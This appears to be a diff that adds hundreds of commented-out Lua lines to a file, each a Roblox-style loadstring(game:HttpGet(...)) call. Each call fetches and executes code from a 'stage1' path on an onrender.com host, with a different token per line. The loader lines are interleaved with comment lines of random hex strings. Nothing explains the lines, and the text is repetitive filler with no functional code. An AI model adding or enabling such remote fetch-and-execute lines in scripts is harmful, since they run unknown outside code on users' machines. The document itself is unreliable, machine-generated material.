+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2c19787f4e63dffe", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9e5e2538024cad53", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_54160cf5fef4ecb1", true))()
+--[[ _48761ef5a9b98af757543f990ef6d252 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7098e944d56f3ad3", true))()
+--[[ _64fe65f3d7967e2fb635ac44dd59828f ]]
+--[[ _5d34a4b509a855334074d6df70c0b186 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1545a99fca0447d6", true))()
+--[[ _757127e0b750cadfee0fc12671eed821 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d02c0381f1596e39", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a00a68f2e08a31ee", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_afbe65059f50060d", true))()
+--[[ _c8ea70818a88493c0cb391c21f6f93e3 ]]
+--[[ _1d92fa95536e63b8d09542b527dc15b3 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a070f3d18bd8eb62", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1ed8099e7534ebc5", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_63402f73bf101a5f", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c45f4f8936a997cd", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1f9e1b153380baf3", true))()
+--[[ _d60038ed1e7a55462a93ec93abe50c78 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5fe557ad52291909", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_88cda788e00b0ce9", true))()
+--[[ _5481b611f71d2bd2f0f10e51f204bf80 ]]
+--[[ _d30014d90ffaa6aa076dd273a2bb7b47 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f27227ab14087688", true))()
+--[[ _7179367a41c500388f6b7f98c9f1e60c ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2e1ce3d4a63ddbd7", true))()
+--[[ _19fe56b6934489de408f51049ec3d4ad ]]
+--[[ _9efb9e48c870059e990d39b409c8e2eb ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_045b6a4ebe49f280", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_27bbfc93d79bc8da", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2e7e835bcbe273cb", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5ef1e14170983956", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cdf96345f11cfc2c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_85c3443a4fa7a9b6", true))()
+--[[ _5fc361c2996b356d375fa90ee7d8cbfc ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5d00caa5745aa91b", true))()
+--[[ _e022f170d4a4ae64d33497ba94933f78 ]]
+--[[ _b8b390c88bbfbd3ed04b86deab45fe32 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6f26e853d4344429", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_823c96651390ee9d", true))()
+--[[ _2d8b90df7ee62b09143a3312b597c895 ]]
+--[[ _9afba4e863fda705c134e73be5b64186 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1505717d2e4f3401", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7e9d45c866b0e759", true))()
+--[[ _f0039134dc9de173d048bcd673634b57 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d813c1ed42624247", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a99d2ea4410a396a", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_24ceaca9fd8c8305", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5088ca1c4fa4cd35", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_284ad9c9a995a5ef", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2d805a1010744289", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f74fa246fea84b9e", true))()
+--[[ _6e0b83d58ef40eba3b9bfdff478105b3 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e962ad4049fbad97", true))()
+--[[ _08349452cc10ceaf35e74087a637fcaa ]]
+--[[ _6e92077de7c52fe17ec94cd5bf0be397 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f55e7d1babda9446", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_21eea22b08c280cd", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c0d0d60e7767735a", true))()
+--[[ _d5f745c38b8fe99eb76babaf5d5e437f ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_11b5f0026beb1aa6", true))()
+--[[ _0d4deb9a2d3931f40ed1d934e5997b2d ]]
+--[[ _93e19100119c0f9c9df601e69e73f141 ]]
+--[[ _de2a4b06fe0673ad389e7360c45b6353 ]]
+--[[ _66d8117c1fb352cf48a73ec98b7f3f87 ]]
+--[[ _025852224dcd9641109b390a94b8b068 ]]
+--[[ _3a9cfe595c2a4ccea3783fd51798be58 ]]
+--[[ _cdb81bdcf4d2898f0c12150f07d893af ]]
+--[[ _3b0dd8e1c8028da86b7225d267189e99 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_650555528dfffdb1", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d5f4504a0cd261bf", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5f5fcf539492a508", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_29087c6058bff5bf", true))()
+--[[ _b9457273d290ae0f521afcbc81a26398 ]]
+--[[ _4e77291916ebe54586faad00f679adb8 ]]
+--[[ _d7390e53cf56402ec2f734614cf883bf ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_14cffe5a74e209d2", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_722c62f2244f738e", true))()
+--[[ _edcf8facf37992e9d73845cd7c962bb9 ]]
+--[[ _fcf3968bac383c588713bc64d0dce42e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ffbf97a32526f650", true))()
+--[[ _97f8913c0417d54068ebbea9015533b7 ]]
+--[[ _2aaec349217eb0d2e5bb8b4c654f27f6 ]]
+--[[ _6ac2d53d06fed51160d4f26ba027ecae ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_aa95c94e6dc92d04", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4cfaecceeb244742", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9a4d7e3701c04d8d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c5d6df624535c038", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8856bdda80599a61", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_67c45305f99f02c7", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_479cb465d91ca60d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_eb399dd191534d73", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c884e5e48cc669a6", true))()
+--[[ _647fef6100b0cfb54cfa55af05555643 ]]
+--[[ _aa8ba0c947fe4a660e8f6a07f752f48e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a48133a05ecc0a5b", true))()
+--[[ _279c5a097e671603171bb30db9241b7e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1f933675b75c2564", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e530f214a06bcece", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_23ca34fed58ae756", true))()
+--[[ _f996be786888a79ad45d4f58be9ce864 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_84c839f134ab2bab", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2b37edf8c5db3d5b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e7a9465def35978d", true))()
+--[[ _9f8672a8b578ba1c445e0a832ea44ee7 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c17ad4eecfb2e6aa", true))()
+--[[ _10dbe3855fed696e35792e3aa6cd744b ]]
+--[[ _0272807f8fbb7483cb9f46c6e0e743f2 ]]
+--[[ _bdd7f49838dcbbda9b975ddd88f05748 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5d444635abe5f32e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b418b8d1a9726ced", true))()
+--[[ _6316accc0c5447de2ef75538034d633d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0300a441199091cb", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b15b11c06e4862ba", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_59ef8c6dcc156994", true))()
+--[[ _ec187170339ab557c831cc888030e5b5 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3da7a2015c18d037", true))()
+--[[ _f92a125b756bb603a142744f7ab7f60b ]]
+--[[ _e9d496bc8d8068b4f3bbfecc5a3c05ad ]]
+--[[ _d9f262b582b3b98231572e55c47eb8dd ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_baa85d8f42009f09", true))()
+--[[ _bf85d5dbc45072cc6f2f46856489c300 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1aaf44407f301e26", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_aeed876e793cac26", true))()
+--[[ _90c508138c63df964f34c727b50a07c3 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8e6c3e00343f1a74", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e63d3e874ef77b55", true))()
+--[[ _99905d2d1c61521b63d5f77d2d1c5ba2 ]]
+--[[ _b995805035cbbd972cefcabb5ac369fa ]]
+--[[ _fcb5062e127a5fb69a1b80b1c6585367 ]]
+--[[ _f43327b846560619be1ab76be85b1ec8 ]]
+--[[ _957213c692d6a2b18b8320ea9a224170 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c099bbcb32bc4965", true))()
+--[[ _f6d274f8a1af6e76563aa53081b8fb9c ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_82987e33626eb48c", true))()
+--[[ _db8173c6f19e304bcada6ee737e3b95e ]]
+--[[ _91302ba3ce0289e4bec352862ba4da6d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4496ef6655f4fd94", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_02bd9d5e9328b2e7", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7692bc5fb200f677", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8b1868dfed30fc34", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8cdaf91e0c0a2f4f", true))()
+--[[ _0c1abcd0d1577a75727b37c18895622c ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e2b0279babb65d3e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_beccf10a8fc8c155", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_17310e1874799412", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d97bf3a2d7b2dcbc", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_44ad53788d46de14", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_57669480159ffbc7", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3bbe5b651e7a3767", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c2801d138bd7c24c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6fc14b44938d6834", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_edeb2f03341a56a7", true))()
+--[[ _90eef7802921738a73a1c5741665299b ]]
+--[[ _8b17018f1f04b151be66a801c8799cec ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c672c109b924490e", true))()
+--[[ _6330ed21ce29c928225aca78c5433f32 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_63be006c31c758b3", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ad5d34fb158d768a", true))()
+--[[ _adf21a383c044f32b795c3f83e980570 ]]
+--[[ _548d391135593ff4b1a2665ee3726986 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_26956142f4c84e74", true))()
+--[[ _aefa3f9fd1319557f490be757c4f712e ]]
+--[[ _5e89f9ad30012909714fcf4ea0030b2b ]]
+--[[ _1398503b12031914a6c93541dea7873c ]]
+--[[ _de84eab147b6a5af6bf70a864e1f01c8 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_083d04ed737b25ce", true))()
+--[[ _dde3c9777eeb621983c6c0b322348f9d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_edc5b809c0cd7ccb", true))()
+--[[ _a40ef0a2bade57ba089caf8f29bdb89f ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0d9e88acaeb3cbc9", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_05efc0b9d118456c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6daf8e647067969a", true))()
+--[[ _ed05bda424a485cbd5c50bee6492de79 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1b55d70afa4f37fc", true))()
+--[[ _706d3ea9129c44ee5735263cf4701946 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a41325b8d0a5b36f", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6ebb619a44d281a9", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_287f1bf4ffd607bc", true))()
+--[[ _2ce7691f4946c4413f21a1683938940c ]]
+--[[ _b0b7a7f55ed9ed45561223314f5043b6 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_25c5551926237bba", true))()
+--[[ _6c6ee7c22b2d292d918aafd17a12bc4e ]]
+--[[ _c9f43c3b4502d116dc10eda6dbb3bceb ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7a17ea447cebbd68", true))()
+--[[ _959919d30107f176127868337e905999 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8a7afa314c69fe2a", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a7981962ab8aa3aa", true))()
+--[[ _c38707124e216bbf2c4df091b2ba378b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9f18b358cdcd6b5d", true))()
+--[[ _fccf164b079a50d2d54591a7d8d94ea6 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f9982e6ba285e0f8", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_11da0a49499b1fc6", true))()
+--[[ _22f6c85e1ea5232eee1072eed87e0976 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_399295eca7098ed4", true))()
+--[[ _ae78d40e5e20228de549592da048f859 ]]
+--[[ _9232df96e46c9255ed017b83c7c6950f ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3ad778a7a5bf8766", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_92a84278342fffe4", true))()
+--[[ _27a33a18c10e39af91c84c3f7a004960 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f7df06a24be8a6b9", true))()
+--[[ _2f859fb788f30ab139e5d721245183ed ]]
+--[[ _cb38785aa1c6ff36000e3b41cb689913 ]]
+--[[ _ebc1d80a40839505c3c8ddaba51c62c5 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5fee050bc0c9d3ab", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cde1a8a3b00649b1", true))()
+--[[ _a68bafbf150d74745d1ef5ea30a1d154 ]]
+--[[ _3a3f237d19eb971284b4dc3b6acc6322 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_114812d99bc6e7e6", true))()
+--[[ _8a48c9e28f7038a2136ccbe0d6611d9f ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cf192f87dd0960d9", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e08eda9582ae43c5", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_bc13b40637241dee", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b3206bed07cd456b", true))()
+--[[ _1ec004a87e19691730305c07d66e6515 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f1287ffcbfd31dc1", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d1c4b5a113ed5629", true))()
+--[[ _f0241108b4e38b67c6d171b42364f06e ]]
+--[[ _2a4d7e9430ebbcb41e907d0de308c740 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e7fe2d1b23d5ff42", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_02dff4bdad5ed590", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7d94998f302e5aff", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1a8003bd89845a67", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d27dbb7ff8884a97", true))()
+--[[ _09a7c7ad8a08940e0dd0e51e7a7a0ab2 ]]
+--[[ _6938f0ce0cdc8c6ba4352a7cb5bd96a0 ]]
+--[[ _c7301f8311da8499ce694b70de020af6 ]]
+--[[ _2295c68d0bed731d31aecea220965b87 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7494d4b9d06480c7", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_998ad81c1fa4b32e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_79e0f3ce324e9f54", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4e43e5fc053f5244", true))()
+--[[ _84a503e99fbc071395d347891a614881 ]]
+--[[ _56fdb6b9ef041f93d7a6f23d194dbca4 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_03a24ba43a5eddfb", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_330e83a208de78e0", true))()
+--[[ _f3cf393fc723f7dc0ee3845ac9c691d4 ]]
+--[[ _1a56cb6a795fc1ae28364966d868f338 ]]
+--[[ _d391d3956a03eab8657fb5dbf95d84b0 ]]
+--[[ _819ae78d7b8fe520ba09a0288f7cd481 ]]
+--[[ _d2e2d3e73847acb4b0fcde318f49927c ]]
+--[[ _6e964818825e30c7b5cc47326bb56d65 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5a2e6aea3943faea", true))()
+--[[ _3a6cdeb0754210f9984c50fa40b6fa8b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b51d09b1da34d32a", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f1376987ff5b5f58", true))()
+--[[ _c15713ecf1a8eacff135c2b3bb3d917e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5bea1a88bfefe907", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_fd06d2e995e66cb4", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0c4420062033e5b3", true))()
+--[[ _d3e85f702f284778b5572e409ddfc070 ]]
+--[[ _003ace20fe074977c387575dfeb3c4dd ]]
+--[[ _77cfb0cee151c11cd1f49dd24e68bf9d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1d77b051b0f8829c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_97375ff46e20f236", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5b7ddb1ff913576b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ef1223846b35f5e9", true))()
+--[[ _711f6c23071f4c1c011d5cd51be340cc ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8e91e2fa7748963e", true))()
+--[[ _8287e3cde98de082d12eacd591addabd ]]
+--[[ _fcf9605ebce737b6db8cf016e37f41ef ]]
+--[[ _f8bd9b3288a28ba63ec8deb478fdbfae ]]
+--[[ _333a627a10b1e17d8c051ce108a4069d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_bd0203938bad29ce", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e3c202da0edd6b48", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_32ae6e819ed603bd", true))()
+--[[ _23a5663431fcf7c532814d96435c8c64 ]]
+--[[ _29302da85570d41342691bd2881e9762 ]]
+--[[ _d956b0e5f57ea8f88118fa357db3c66f ]]
+--[[ _92d8e594352c28de6d5487df41de3028 ]]
+--[[ _ea295c53f8e41b5c9ffbd79174f21dda ]]
+--[[ _c396a16f4918cd8cebc8f9026dcc69ad ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5f93d94d6cea175b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d29ba0ea365d02f9", true))()
+--[[ _202cbe721aead8499d9dbbff1ca4c1ab ]]
+--[[ _0c2f275b3b1779e2b980fe3d22075268 ]]
+--[[ _975c7895b6162b4e9db6edbf56944a15 ]]
+--[[ _662b9752dc8e6e5c2b386c4b3aab32c7 ]]
+--[[ _cf8afe118b930d5189c61c6d572f448c ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_06ae373a7b8dc00f", true))()
+--[[ _15ccd9971d9004cb8654430a9553a5f4 ]]
+--[[ _a93dc3e16710ba86dcebabc4965d4047 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8bfb0f72abd30eb6", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_48b99f24b8ca8f59", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8c19e8dfe806ee8c", true))()
+--[[ _8cc28c2224038614f467f6abd2e6b68c ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2c2aac61f67fed78", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e1fa09be2d765eb0", true))()
+--[[ _ad5a5b80b6b5fc1c28fdd6ff1f315ae9 ]]
+--[[ _46103017fc0b28e0f690eab629026ba9 ]]
+--[[ _d27d4203c6c7e3ef5f3787ae43e5f05f ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a12d7590ce8f04ba", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_382f953d228e7c30", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_df8e633d117746a6", true))()
+--[[ _13825fd3000f5f72d1dca7903934e4a2 ]]
+--[[ _96c15f7f1ad16d02b234542a557ffcce ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_dd333626233c9cb0", true))()
+--[[ _d38e808f47434775cc06764f5f77931b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1a0e74b0b58a807b", true))()
+--[[ _79e1c40fb4f8dc63624a177f8a557056 ]]
+--[[ _eb595ff7b39e3423f4b7c477a9f95bb6 ]]
+--[[ _c3564a52195187fc415e6cd06def7f89 ]]
+--[[ _b86c0da15798f867e7d8adb772c7f0a5 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0d6530c43706bfba", true))()
+--[[ _88c08d7fe8aa3462ba3a630ac604e58c ]]
+--[[ _4e1de86865bb62f4dfc3f4508903470e ]]
+--[[ _83ac9a4404392a4ec98280781300d827 ]]
+--[[ _df27973d5b3478fef69bc668a299396d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e5eff754116b3708", true))()
+--[[ _6dd473f143a4f97f1be5ad82973409c7 ]]
+--[[ _55b58649aec1d8255cdf9c6a75199c9f ]]
+--[[ _86615a3198cbfbf3ef86ba2ab8608ce1 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_984078f24d8d44b9", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_50e6e54089538e16", true))()
+--[[ _9cd6cdbea0db4908bfaea9f091bdec00 ]]
+--[[ _d3e952aeeecbcdb95ad900f1a4548a5e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1df22bd579568813", true))()
+--[[ _3e0e7476d1ee892b907021ad9f25b14c ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_47efaaa660dbdc37", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e950f0be6ddaf4fd", true))()
+--[[ _16ab20e9573f2987d1acc43d96526d2b ]]
+--[[ _a250dd486d66f5be4375151ee727069d ]]
+--[[ _5300daacb46067938e0d352c5c54f775 ]]
+--[[ _5e7789d65b02ae8782b0e393045481b8 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_db70680bd7e28cdc", true))()
+--[[ _6b4ea9d18a04752501f13b392bfcf6dc ]]
+--[[ _168f10a0b9a2f9a17d6cc113ebd7bc51 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d6eb7c81e5ca9679", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8f23de241902f0e0", true))()
+--[[ _e2135e557c3d920eb51161ec9ba8654b ]]
+--[[ _f212dfdaefd807b61023ca7299cc93bf ]]
+--[[ _2b6d8122fa2dce7182851a49ec6089fd ]]
+--[[ _71cc09de8c812494f7c1b1a11d22d0d5 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_97eda56edaf12ec3", true))()
+--[[ _17e5b2032e6ac513669dbd64f7b22597 ]]
+--[[ _01139afdea8aca24ddf6465652e874a9 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3c56b001647648d0", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e183db19df99a0bf", true))()
+--[[ _3945ccb9ec29ee787da2d22ce0021057 ]]
+--[[ _92e92651c4e5da36d3df50d5521aa9fc ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6fe3d6d940e0711f", true))()
+--[[ _409f201218c10b91a296f6e6bbe7cdda ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d6852cb3f8dc376b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b3d3872c988a314c", true))()
+--[[ _cf89483434b5d3b7bc0e7958c3ec01e9 ]]
+--[[ _0b50cec3e5c8c0f2ac1d03674a27dd82 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f0e56b22f6d1af77", true))()
